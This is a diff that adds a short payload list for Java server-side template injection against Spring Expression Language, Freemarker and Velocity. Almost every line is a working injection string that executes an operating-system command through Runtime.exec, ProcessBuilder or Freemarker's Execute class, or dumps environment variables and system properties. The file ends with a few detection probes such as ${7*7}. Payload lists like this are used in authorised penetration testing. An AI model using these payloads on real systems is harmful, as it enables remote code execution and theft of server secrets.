@@ -1,0 +1,21 @@
+# Java SSTI Payloads (SpEL, Freemarker, Velocity)
+
+# SpEL (Spring Expression Language)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('id')}
+${T(new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).useDelimiter('\\A').next()}
+
+# Freemarker
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+
+# Velocity
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
+$class.inspect("java.lang.System").type.getenv()
+
+# Identification
+#{7*7}
+${7*7}
+@environment
+@systemProperties
